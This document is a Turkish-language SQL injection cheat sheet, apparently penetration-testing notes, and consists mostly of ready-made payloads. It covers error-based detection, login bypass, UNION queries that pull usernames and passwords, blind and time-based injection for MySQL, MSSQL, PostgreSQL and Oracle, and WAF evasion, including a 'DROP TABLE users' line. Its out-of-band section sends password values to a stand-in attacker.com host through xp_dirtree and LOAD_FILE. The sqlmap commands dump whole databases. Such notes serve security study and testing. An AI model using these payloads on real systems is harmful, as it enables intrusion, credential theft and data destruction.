## SQL Injection

SQL Injection, kullanıcı girdisinin SQL sorgusuna zararlı şekilde eklenmesi sonucu sorgu mantığının değiştirilmesiyle oluşan bir güvenlik açığıdır.

---

## Tespit (Error-based)

* `'`
* `"`
* `'--`
* `' OR '1'='1`
* `' OR 1=1--`
* `admin'--`

---

## Authentication Bypass

Login form username alanı:

* `admin' --`
* `admin' OR '1'='1`
* `' OR 1=1--`
* `' OR ''='`

---

## Union-Based (Veri Çekme)

Kolon sayısı tespiti:

* `' ORDER BY 1--`
* `' ORDER BY 2--`
* `' ORDER BY 3--`

(Hata alınan sayıdan bir önceki kolon sayıdır)

Veri çekme:

* `' UNION SELECT NULL,NULL,NULL--`
* `' UNION SELECT username,password,NULL FROM users--`

MySQL bilgi toplama:

* `' UNION SELECT table_name,NULL,NULL FROM information_schema.tables--`
* `' UNION SELECT column_name,NULL,NULL FROM information_schema.columns WHERE table_name='users'--`

---

## Boolean-Based Blind SQLi

* `' AND 1=1--`
* `' AND 1=2--`

Veri çıkarma (karakter bazlı):

* `' AND SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='a'--`

---

## Time-Based Blind SQLi

MySQL:

* `' AND SLEEP(5)--`
* `' AND IF(1=1,SLEEP(5),0)--`

MSSQL:

* `'; WAITFOR DELAY '0:0:5'--`

PostgreSQL:

* `'; SELECT pg_sleep(5)--`

Oracle:

* `' AND DBMS_LOCK.SLEEP(5)--`

---

## Out-of-Band (OOB) Exfiltration

MSSQL DNS tabanlı:

* `'; EXEC master..xp_dirtree '\\'+(SELECT password FROM users)+'.attacker.com\a'--`

MySQL (yetki gerekebilir):

* `' UNION SELECT LOAD_FILE(CONCAT('\\\\',(SELECT password FROM users LIMIT 1),'.attacker.com\\a'))--`

---

## WAF Bypass Teknikleri

* `/**/SELECT/**/`
* `'SeLeCt`
* `%27%20OR%201=1--`
* `'; DROP TABLE users;--` *(stacked query destekleniyorsa)*
* `UN/**/ION SEL/**/ECT`

---

## Test Araçları

sqlmap:

* `sqlmap -u "http://target.com/page?id=1" --dbs`
* `sqlmap -u "http://target.com/page?id=1" -D dbname --tables`
* `sqlmap -u "http://target.com/page?id=1" -D dbname -T users --dump`

Burp Suite:

* Repeater ile manuel test

---

## Tespit Stratejisi

1. `'` veya `"` gönder
2. Hata dönüyorsa SQLi ihtimali
3. Boolean test:

   * `AND 1=1`
   * `AND 1=2`
4. Fark yoksa time-based test:

   * `SLEEP(5)`
5. Doğrulandıktan sonra sqlmap ile otomasyon
